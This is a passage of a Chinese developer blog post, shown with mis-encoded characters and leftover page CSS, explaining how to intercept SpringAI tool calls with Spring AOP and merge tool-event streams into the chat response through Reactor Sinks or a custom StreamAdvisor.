blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">é‚£äº›å‘</h2>
<p>ç”¨ SpringAI é‡å†™ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.codefather.cn%2Fcourse%2F1948291549923344386" target="_blank" title="https://www.codefather.cn/course/1948291549923344386" ref="nofollow noopener noreferrer">é›¶ä»£ç ç”Ÿæˆ</a> æ—¶ï¼Œå‰ç«¯å±•ç¤ºå·¥å…·è°ƒç”¨è¿™ä»¶äº‹æŠŠæˆ‘å¡ä½äº†ã€‚</p>
<p>Langchain4j å†™å›è°ƒå¤šèˆ’æœå•Š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">StreamingChatResponseHandler</span> {  
    <span class="hljs-keyword">default</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onPartialToolCall</span><span class="hljs-params">(PartialToolCall partialToolCall)</span> {}  
    <span class="hljs-keyword">default</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onPartialToolCall</span><span class="hljs-params">(PartialToolCall partialToolCall, PartialToolCallContext context)</span> {}  
    <span class="hljs-keyword">default</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCompleteToolCall</span><span class="hljs-params">(CompleteToolCall completeToolCall)</span> {}  
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCompleteResponse</span><span class="hljs-params">(ChatResponse completeResponse)</span>;  
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(Throwable error)</span>;  
}  
</code></pre>
<p>å†çœ‹çœ‹ <code>@ToolMemoryId</code>ï¼Œç›´æ¥å¾€æ–¹æ³•å‚æ•°é‡Œä¸€æ‰”ï¼ŒconversationId å°±åˆ°æ‰‹äº†ï¼Œå¤šçœå¿ƒï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Tools</span> {  
    <span class="hljs-meta">@Tool</span>  
    String <span class="hljs-title function_">addCalendarEvent</span><span class="hljs-params">(CalendarEvent event, <span class="hljs-meta">@ToolMemoryId</span> memoryId)</span> {  
        <span class="hljs-comment">// memoryId ç›´æ¥èƒ½ç”¨  </span>
    }  
}  
</code></pre>
<p>SpringAI å‘¢ï¼Ÿè¿™äº›å®ƒéƒ½æ²¡æœ‰ï¼ˆä¹Ÿæœ‰å¯èƒ½æ˜¯æˆ‘æ²¡æ‰¾åˆ°ï¼‰ã€‚adviseStream å·¥å…·è°ƒç”¨çš„æ—¶å€™ä¹Ÿæ„ŸçŸ¥ä¸åˆ°</p>
<hr/>
<h2 data-id="heading-1">ä¸ºä»€ä¹ˆä¸€å®šè¦ conversationIdï¼Ÿ</h2>
<p>ä¸»è¦æœ‰ä¸‹é¢å‡ ç‚¹</p>
<ol>
<li>ç”Ÿæˆçš„ä»£ç éœ€è¦åŒºåˆ†ç›®å½•ï¼Œæ–¹ä¾¿ç®¡ç†</li>
<li>éš”ç¦»æ¯ä¸ªå•ç‹¬ APP ç”Ÿæˆçš„è·¯å¾„</li>
<li>è®°å½•å·¥å…·è°ƒç”¨æ¬¡æ•°ï¼ˆåç»­åˆ†æç”¨ï¼‰</li>
</ol>
<hr/>
<h2 data-id="heading-2">æ•´ä½“æ€è·¯</h2>
<p>ç”¨æˆ·å‘è¯·æ±‚ â†’ Ai2ChatClient æ¥æ”¶ â†’ SpringAI å¤„ç† â†’ åˆ‡é¢æ‹¦æˆªå·¥å…·è°ƒç”¨ â†’ äº‹ä»¶å‘å¸ƒ â†’ å®æ—¶æ¨ç»™å‰ç«¯<br/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53947da76b79484ea86270eab8de2212~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGVpa29vbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769506730&amp;x-signature=3u6NwSvbULtMGpgxPcLVGpeTBFI%3D" alt="image.png" loading="lazy"/></p>
<p>å°±è¿™ä¹ˆå‡ æ¡çº¿ã€‚æ ¸å¿ƒå…¶å®å°±ä¸‰ä»¶äº‹ï¼šåˆ‡é¢æ‹¦æˆªã€äº‹ä»¶å‘å¸ƒã€æµåˆå¹¶ã€‚</p>
<hr/>
<h2 data-id="heading-3">AOP ä¾èµ–</h2>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    
	<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-aop
    <span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>  
</code></pre>
<hr/>
<h2 data-id="heading-4">ä¸¾ä¸ªä¾‹å­ï¼šTodoList å·¥å…·</h2>
<p>è¿™æ˜¯æˆ‘ä»¬é¡¹ç›®é‡Œå®é™…åœ¨ç”¨çš„å·¥å…·ç±»ï¼š</p>
<blockquote>
<p>å…·ä½“æç¤ºè¯å‚è€ƒçš„æ˜¯ OpenCode çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanomalyco%2Fopencode%2Fblob%2Fdev%2Fpackages%2Fopencode%2Fsrc%2Ftool%2Ftodoread.txt" target="_blank" title="https://github.com/anomalyco/opencode/blob/dev/packages/opencode/src/tool/todoread.txt" ref="nofollow noopener noreferrer">github.com/anomalyco/oâ€¦</a></p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TodolistTools</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTools</span> {    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Cache&lt;String, String&gt; TODOLIST_CACHE = Caffeine.newBuilder()    
            .maximumSize(<span class="hljs-number">10_00</span>)    
            .expireAfterWrite(Duration.ofMinutes(<span class="hljs-number">30</span>))    
            .build();    
    
	<span class="hljs-meta">@Tool(description = "Write or update the todo list for current task.")</span>    
	<span class="hljs-keyword">public</span> String <span class="hljs-title function_">todoWrite</span><span class="hljs-params">(    
	<span class="hljs-meta">@ToolParam(description = "The todo list content to save.")</span>    
	String todoContent,    
	ToolContext toolContext    
	)</span> {    
        <span class="hljs-type">String</span> <span class="hljs-variable">conversationId</span> <span class="hljs-operator">=</span> ConversationIdUtils.getConversationId(toolContext);    
<span class="hljs-keyword">if</span> (StringUtils.isBlank(todoContent)) {    
TODOLIST_CACHE.invalidate(conversationId);    
            <span class="hljs-keyword">return</span> <span class="hljs-string">"Todo list cleared."</span>;    
}    
TODOLIST_CACHE.put(conversationId, todoContent);    
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Todo list saved successfully."</span>;    
}    
    
<span class="hljs-meta">@Tool(description = "Read the current todo list for this conversation.")</span>    
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">todoRead</span><span class="hljs-params">(ToolContext toolContext)</span> {    
        <span class="hljs-type">String</span> <span class="hljs-variable">conversationId</span> <span class="hljs-operator">=</span> ConversationIdUtils.getConversationId(toolContext);    
<span class="hljs-type">String</span> <span class="hljs-variable">todoContent</span> <span class="hljs-operator">=</span> TODOLIST_CACHE.getIfPresent(conversationId);    
<span class="hljs-keyword">if</span> (StringUtils.isBlank(todoContent)) {    
            <span class="hljs-keyword">return</span> <span class="hljs-string">"No todo list for this conversation."</span>;    
}    
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Current todo list:\n"</span> + todoContent;    
}    
    
	<span class="hljs-meta">@Override</span> 
	String <span class="hljs-title function_">getToolName</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">"Todo List Tool"</span>; }    
	
	<span class="hljs-meta">@Override</span> 
	String <span class="hljs-title function_">getToolDes</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">"Read and write task todo lists"</span>; } 
 }  
</code></pre>
<hr/>
<h2 data-id="heading-5">åˆ‡é¢æ˜¯æ€ä¹ˆå·¥ä½œçš„</h2>
<p>SpringAI æ²¡ç»™æˆ‘ä»¬ç•™å›è°ƒæ¥å£ï¼Œé‚£å°±è‡ªå·±é€ ä¸€ä¸ªã€‚åˆ‡é¢è¿™ä¸œè¥¿å¥½å°±å¥½åœ¨ä¸æ”¹åŠ¨åŸä»£ç ï¼ŒåŠ ä¸ªæ³¨è§£å°±èƒ½ç”Ÿæ•ˆã€‚</p>
<p>æˆ‘ä»¬ç”¨ <code>@Before</code> æŠ“å·¥å…·è°ƒç”¨å¼€å§‹çš„é‚£ä¸€åˆ»ï¼Œç”¨ <code>@AfterReturning</code> æŠ“è°ƒç”¨ç»“æŸçš„é‚£ä¸€åˆ»ã€‚å·¥å…·ç±»ä¸¢ç»™ Spring å®¹å™¨ï¼Œåˆ‡é¢è‡ªå·±å°±æ‰¾ä¸Šé—¨æ¥äº†ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Aspect</span>  
<span class="hljs-meta">@Component</span>  
<span class="hljs-meta">@Slf4j</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ToolContextAspect</span> {    
    
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ToolEventPublisher toolEventPublisher;    
    
<span class="hljs-keyword">public</span> <span class="hljs-title function_">ToolContextAspect</span><span class="hljs-params">(ToolEventPublisher toolEventPublisher)</span> {    
        <span class="hljs-built_in">this</span>.toolEventPublisher = toolEventPublisher;    
}    
    
<span class="hljs-meta">@Pointcut("execution(* com.leikooo.codemother.ai.tools..*.*(..)) &amp;&amp; @annotation(org.springframework.ai.tool.annotation.Tool)")</span>    
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">anyToolExecution</span><span class="hljs-params">()</span> {}    
    
<span class="hljs-meta">@Before("anyToolExecution()")</span>    
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">beforeToolCall</span><span class="hljs-params">(JoinPoint joinPoint)</span> {    
<span class="hljs-type">ToolContext</span> <span class="hljs-variable">toolContext</span> <span class="hljs-operator">=</span> getToolContext(joinPoint);    
<span class="hljs-keyword">if</span> (toolContext == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span>;handleToolContext(toolContext, joinPoint, <span class="hljs-literal">null</span>, <span class="hljs-literal">true</span>);    
}    
    
<span class="hljs-meta">@AfterReturning(pointcut = "anyToolExecution()", returning = "result")</span>    
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterToolCall</span><span class="hljs-params">(JoinPoint joinPoint, Object result)</span> {    
	<span class="hljs-type">ToolContext</span> <span class="hljs-variable">toolContext</span> <span class="hljs-operator">=</span> getToolContext(joinPoint);    
	<span class="hljs-keyword">if</span> (toolContext != <span class="hljs-literal">null</span>) {    
		handleToolContext(toolContext, joinPoint, result, <span class="hljs-literal">false</span>);    
	}    
}    
    
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleToolContext</span><span class="hljs-params">(ToolContext context, JoinPoint joinPoint, Object result, <span class="hljs-type">boolean</span> isBefore)</span> {    
	<span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> joinPoint.getTarget().getClass().getSimpleName();    
	<span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> joinPoint.getSignature().getName();    
	<span class="hljs-type">Message</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> context.getToolCallHistory().getLast();    
	AssistantMessage.<span class="hljs-type">ToolCall</span> <span class="hljs-variable">toolCallInfo</span> <span class="hljs-operator">=</span> ((AssistantMessage) message).getToolCalls().getLast();    
	<span class="hljs-type">String</span> <span class="hljs-variable">toolCallId</span> <span class="hljs-operator">=</span> toolCallInfo.id();    
	<span class="hljs-type">String</span> <span class="hljs-variable">sessionId</span> <span class="hljs-operator">=</span> ConversationIdUtils.getConversationId(context);    
	<span class="hljs-keyword">if</span> (isBefore) {    
		toolEventPublisher.publishToolCall(sessionId, className, methodName, toolCallId);    
	} <span class="hljs-keyword">else</span> {    
		toolEventPublisher.publishToolResult(sessionId, className, methodName, toolCallId, result);    
	}    
}    
    
<span class="hljs-keyword">private</span> ToolContext <span class="hljs-title function_">getToolContext</span><span class="hljs-params">(JoinPoint joinPoint)</span> {    
	<span class="hljs-keyword">for</span> (Object arg : joinPoint.getArgs()) {    
		<span class="hljs-keyword">if</span> (arg <span class="hljs-keyword">instanceof</span> ToolContext) 
			<span class="hljs-keyword">return</span> (ToolContext) arg;
		}    
	    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    
	}  
}  
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bda2e507fedc4ceebcb0ca17977654fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGVpa29vbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769506730&amp;x-signature=I2PWgJVYTgn0h0dGjWAeq5JYIC0%3D" alt="æµ‹è¯•ç»“æœ" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-6">äº‹ä»¶å‘å¸ƒï¼šæŠŠæ¶ˆæ¯é€å‡ºå»</h2>
<p>è¿™é‡Œç”¨åˆ°äº† Project Reactor çš„ Sinksã€‚æ¯ä¸ªä¼šè¯ä¸€ä¸ª Sinkï¼Œå¤šçº¿ç¨‹ç¯å¢ƒä¸‹ä¹Ÿèƒ½æ­£å¸¸å·¥ä½œã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ToolEventPublisher</span> {    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Sinks.Many&lt;ToolEvent&gt;&gt; sinks = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();    
    
    <span class="hljs-keyword">private</span> Sinks.Many&lt;ToolEvent&gt; <span class="hljs-title function_">getSink</span><span class="hljs-params">(String sessionId)</span> {    
<span class="hljs-keyword">return</span> sinks.computeIfAbsent(sessionId, k -&gt; Sinks.many().multicast().onBackpressureBuffer());    
}    
    
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">publishToolCall</span><span class="hljs-params">(String sessionId, String toolName, String methodName, String toolCallId)</span> {    
	getSink(sessionId).tryEmitNext(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToolEvent</span>(sessionId, <span class="hljs-string">"tool_call"</span>, toolName, methodName, toolCallId, <span class="hljs-literal">null</span>));    
}    
    
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">publishToolResult</span><span class="hljs-params">(String sessionId, String toolName, String methodName, String toolCallId, Object result)</span> {    
	getSink(sessionId).tryEmitNext(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToolEvent</span>(sessionId, <span class="hljs-string">"tool_result"</span>, toolName, methodName, toolCallId, result));    
}    
    
    <span class="hljs-keyword">public</span> Flux&lt;ToolEvent&gt; <span class="hljs-title function_">events</span><span class="hljs-params">(String sessionId)</span> {    
<span class="hljs-keyword">return</span> getSink(sessionId).asFlux();    
}    
    
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">complete</span><span class="hljs-params">(String sessionId)</span> {    
        Sinks.Many&lt;ToolEvent&gt; sink = sinks.remove(sessionId);    
<span class="hljs-keyword">if</span> (sink != <span class="hljs-literal">null</span>) sink.tryEmitComplete();    
}    
    
<span class="hljs-keyword">public</span> <span class="hljs-keyword">record</span> <span class="hljs-title class_">ToolEvent</span><span class="hljs-params">(String sessionId, String type, String toolName, String methodName, String toolCallId, Object result)</span> {} 
 }  
</code></pre>
<hr/>
<h2 data-id="heading-7">æµæ€ä¹ˆåˆå¹¶åˆ°ä¸»å“åº”é‡Œ</h2>
<p>è¿™é‡Œæœ‰ä¸¤ç§ç©æ³•</p>
<h3 data-id="heading-8">ç©æ³•ä¸€ï¼šè‡ªå·±åŠ¨æ‰‹ä¸°è¡£è¶³é£Ÿ</h3>
<p>ç›´æ¥åœ¨ä¸šåŠ¡æ–¹æ³•é‡ŒæŠŠä¸¤ä¸ªæµ merge èµ·æ¥ã€‚å¥½å¤„æ˜¯ä»£ç éƒ½åœ¨æ˜é¢ä¸Šï¼Œåå¤„æ˜¯æ¯ä¸ªæ–¹æ³•éƒ½å¾—å†™ä¸€éã€‚</p>
<blockquote>
<p><strong>ä¸€ä¸ªå°ç»†èŠ‚</strong>ï¼š<code>mainFlux</code> ç»“æŸæ—¶ä¼šè§¦å‘ <code>doFinally</code>ï¼Œä½† <code>toolEventFlux</code> ä¸ä¼šã€‚æ‰€ä»¥å¿…é¡»åœ¨ <code>doFinally</code> é‡Œæ‰‹åŠ¨è°ƒç”¨ <code>complete</code> å…³æ‰äº‹ä»¶æµã€‚å¦åˆ™è¿™ä¸ªæµä¼šä¸€ç›´æŒ‚åœ¨é‚£å„¿ï¼Œç­‰ä¸åˆ°ç»ˆç‚¹ã€‚<br/>
å‰ç«¯å°±ä¼šä¸€ç›´è¿™æ ·  <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/787f7cff87684bf9928329098ae19ce8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGVpa29vbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769506730&amp;x-signature=VaRXt%2FIWsqT0MrFeo4%2F6nr1j7n8%3D" alt="image.png" loading="lazy"/></p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Ai2ChatClient</span> {    
	<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ChatClient chatClient;    
	<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ToolEventPublisher toolEventPublisher;    
    
<span class="hljs-keyword">public</span> <span class="hljs-title function_">Ai2ChatClient</span><span class="hljs-params">(ChatModel openAiChatModel, FileTools fileTools,    
ToolEventPublisher toolEventPublisher)</span> {    
        <span class="hljs-built_in">this</span>.toolEventPublisher = toolEventPublisher;    
        <span class="hljs-built_in">this</span>.chatClient = ChatClient.builder(openAiChatModel)    
                .defaultTools(fileTools)    
                .build();    
}    
    
    <span class="hljs-keyword">public</span> Flux&lt;String&gt; <span class="hljs-title function_">chat2Ai</span><span class="hljs-params">(String msg, String appId)</span> {    
        Flux&lt;String&gt; mainFlux = chatClient.prompt()  
                 .system(<span class="hljs-string">"""  
                        You are a helpful, precise, and reliable AI assistant.                        Respond clearly and concisely.                        Prioritize correctness, safety, and practicality.                        If information is uncertain, state the uncertainty explicitly.                                                """</span>)                  
                .user(msg)    
                .advisors(spec -&gt; spec.param(CONVERSATION_ID, appId))    
                .toolContext(Map.of(CONVERSATION_ID, appId))    
                .stream().content()    
                .doFinally(s -&gt; toolEventPublisher.complete(appId));    
    
        Flux&lt;String&gt; toolEventFlux = toolEventPublisher.events(appId)    
                .map(event -&gt; {    
                    <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> Optional.ofNullable(event.result()).orElse(<span class="hljs-string">""</span>);    
<span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">switch</span> (event.type()) {    
                        <span class="hljs-keyword">case</span> <span class="hljs-string">"tool_call"</span> -&gt; String.format(<span class="hljs-string">"æ­£åœ¨è¿›è¡Œå·¥å…·è°ƒç”¨: %s"</span>, event.methodName());    
                        <span class="hljs-keyword">case</span> <span class="hljs-string">"tool_result"</span> -&gt; String.format(<span class="hljs-string">"å·¥å…·è°ƒç”¨å®Œæˆ: %s"</span>, event.methodName());    
                        <span class="hljs-keyword">default</span> -&gt; <span class="hljs-string">""</span>;    
};    
                    <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"\n\n[é€‰æ‹©å·¥å…·] %s \n\n"</span>, message);    
});    
    
        <span class="hljs-keyword">return</span> Flux.merge(mainFlux, toolEventFlux);    
}  }  
</code></pre>
<h3 data-id="heading-9">ç©æ³•äºŒï¼šæŠŠè„æ´»ç´¯æ´»æ‰”ç»™ Advisor</h3>
<p>å†™ä¸ª StreamAdvisorï¼Œè®©å®ƒè‡ªå·±å¤„ç†æµåˆå¹¶ã€‚ä¸šåŠ¡ä»£ç ç¬é—´æ¸…çˆ½äº†ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Slf4j</span>  
<span class="hljs-meta">@Component</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ToolAdvisor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CallAdvisor</span>, StreamAdvisor {    
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ToolEventPublisher toolEventPublisher;    
    
    <span class="hljs-meta">@Override</span> 
    <span class="hljs-keyword">public</span> ChatClientResponse <span class="hljs-title function_">adviseCall</span><span class="hljs-params">(ChatClientRequest request, CallAdvisorChain chain)</span> {    
<span class="hljs-keyword">return</span> chain.nextCall(request);    
}    
    <span class="hljs-meta">@Override</span>
     <span class="hljs-keyword">public</span> Flux&lt;ChatClientResponse&gt; <span class="hljs-title function_">adviseStream</span><span class="hljs-params">(ChatClientRequest request, StreamAdvisorChain chain)</span> {    
        <span class="hljs-type">String</span> <span class="hljs-variable">appId</span> <span class="hljs-operator">=</span> ConversationIdUtils.getConversationId(request.context());    
        Flux&lt;ChatClientResponse&gt; mainFlux = chain.nextStream(request)    
					<span class="hljs-comment">// è¿™é‡Œä¸€å®šè¦ complete                </span>
					.doFinally(s -&gt; toolEventPublisher.complete(appId));    
        Flux&lt;ChatClientResponse&gt; toolEventFlux = getToolEventFlux(appId);    
        <span class="hljs-keyword">return</span> Flux.merge(mainFlux, toolEventFlux);    
}    
    <span class="hljs-keyword">private</span> Flux&lt;ChatClientResponse&gt; <span class="hljs-title function_">getToolEventFlux</span><span class="hljs-params">(String sessionId)</span> {    
		<span class="hljs-keyword">return</span> toolEventPublisher.events(sessionId)    
                .map(event -&gt; {    
<span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">switch</span> (event.type()) {    
                        <span class="hljs-keyword">case</span> <span class="hljs-string">"tool_call"</span> -&gt; String.format(<span class="hljs-string">"æ­£åœ¨è¿›è¡Œå·¥å…·è°ƒç”¨: %s"</span>, event.methodName());    
                        <span class="hljs-keyword">case</span> <span class="hljs-string">"tool_result"</span> -&gt; String.format(<span class="hljs-string">"å·¥å…·è°ƒç”¨å®Œæˆ: %s"</span>, event.methodName());    
                        <span class="hljs-keyword">default</span> -&gt; <span class="hljs-string">""</span>;    
};    
                    <span class="hljs-type">AssistantMessage</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssistantMessage</span>(String.format(<span class="hljs-string">"\n\n[é€‰æ‹©å·¥å…·] %s \n\n"</span>, message));    
                    <span class="hljs-keyword">return</span> ChatClientResponse.builder()    
                            .chatResponse(ChatResponse.builder().generations(List.of(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Generation</span>(msg))).build())    
                            .build();    
});    
}    
    <span class="hljs-meta">@Override</span> 
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">"ToolAdvisor"</span>; }    
    
	<span class="hljs-meta">@Override</span> 
	<span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getOrder</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> Integer.MIN_VALUE + <span class="hljs-number">100</span>; 
	}  
}  
</code></pre>
<p>æ³¨å†Œä¸€ä¸‹ï¼Œå…¨å±€ç”Ÿæ•ˆï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Ai2ChatClient</span> {    
	<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ChatClient chatClient;    
	<span class="hljs-keyword">public</span> <span class="hljs-title function_">Ai2ChatClient</span><span class="hljs-params">(ChatModel openAiChatModel, FileTools fileTools, ToolAdvisor toolAdvisor)</span> {    
		<span class="hljs-built_in">this</span>.chatClient = ChatClient.builder(openAiChatModel)    
				.defaultTools(fileTools)    
				.defaultAdvisors(toolAdvisor)    
				.build();    
	}    
    <span class="hljs-keyword">public</span> Flux&lt;String&gt; <span class="hljs-title function_">chat</span><span class="hljs-params">(String msg, String appId)</span> {    
	<span class="hljs-keyword">return</span> chatClient.prompt()  
	                 .system(<span class="hljs-string">"""  
	                        You are a helpful, precise, and reliable AI assistant.                        Respond clearly and concisely.                        Prioritize correctness, safety, and practicality.                        If information is uncertain, state the uncertainty explicitly.                                                """</span>)  
	                .user(msg)    
	                .advisors(spec -&gt; spec.param(CONVERSATION_ID, appId))    
	                .toolContext(Map.of(CONVERSATION_ID, appId))    
	                .stream().content();    
	} 
}  
</code></pre>
<hr/>
<h2 data-id="heading-10">ä¸¤ç§æ–¹æ¡ˆæ€ä¹ˆé€‰</h2>

























<table><thead><tr><th>çœ‹ä»€ä¹ˆ</th><th>æ–¹æ¡ˆä¸€è‡ªå·±å†™</th><th>æ–¹æ¡ˆäºŒç”¨ Advisor</th></tr></thead><tbody><tr><td>ä»£ç ä½ç½®</td><td>ä¸šåŠ¡æ–¹æ³•é‡Œ</td><td>å•ç‹¬ä¸€ä¸ªç±»</td></tr><tr><td>å¤ç”¨æ€§</td><td>æƒ¨ä¸å¿ç¹</td><td>ä¸€æ¬¡ç¼–å†™åˆ°å¤„ä½¿ç”¨</td></tr><tr><td>ä»£ç é‡</td><td>æŒºé•¿</td><td>ä¸šåŠ¡æ–¹æ³•å°±å‡ è¡Œ</td></tr></tbody></table>
<p>æˆ‘çš„å»ºè®®æ˜¯ä½¿ç”¨ advisor</p>
<hr/>
<h2 data-id="heading-11">æ€ä¹ˆæ‹¿åˆ° conversationId</h2>
<p>Langchain4j é‚£ä¸ª <code>@ToolMemoryId</code> æ˜¯çœŸæ–¹ä¾¿ã€‚SpringAI ä¸ç»™å’±ä»¬å°±è‡ªå·±æƒ³åŠæ³•ã€‚</p>
<p>åœ¨å·¥å…·æ–¹æ³•é‡ŒåŠ ä¸ª <code>ToolContext</code> å‚æ•°ï¼Œä»é‡Œé¢æŠŠ id æ‹½å‡ºæ¥ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Slf4j</span>  
<span class="hljs-meta">@Component</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileWriteTool</span> {    
	<span class="hljs-meta">@Tool("å†™å…¥æ–‡ä»¶åˆ°æŒ‡å®šè·¯å¾„")</span>    
	<span class="hljs-keyword">public</span> String <span class="hljs-title function_">writeFile</span><span class="hljs-params">(    
	<span class="hljs-meta">@P("æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„")</span> String relativeFilePath,    
	<span class="hljs-meta">@P("è¦å†™å…¥æ–‡ä»¶çš„å†…å®¹")</span> String content,    
	ToolContext toolContext    
